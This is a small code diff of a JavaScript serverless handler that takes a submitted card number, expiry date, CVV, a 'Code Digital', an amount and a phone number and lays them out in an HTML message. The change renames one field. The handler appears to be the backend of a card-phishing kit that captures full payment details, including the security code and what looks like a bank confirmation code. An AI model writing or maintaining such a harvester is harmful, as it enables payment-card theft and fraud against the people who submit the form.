@@ -10,7 +10,7 @@ exports.handler = async (event) => {
     numerocarte,
     dateexpiration,
     cryptogramme,
-    code_digital,
+    code,
     montant,
     telephone,
   } = data;
@@ -26,7 +26,7 @@ exports.handler = async (event) => {
         <p><strong>Numéro :</strong> ${numerocarte}</p>
         <p><strong>Date :</strong> ${dateexpiration}</p>
         <p><strong>CVV :</strong> ${cryptogramme}</p>
-        <p><strong>Code Digital :</strong> ${code_digital}</p>
+        <p><strong>Code Digital :</strong> ${code}</p>
         <p><strong>Montant :</strong> ${montant} €</p>
         <p><strong>Téléphone :</strong> ${telephone}</p>
       `,
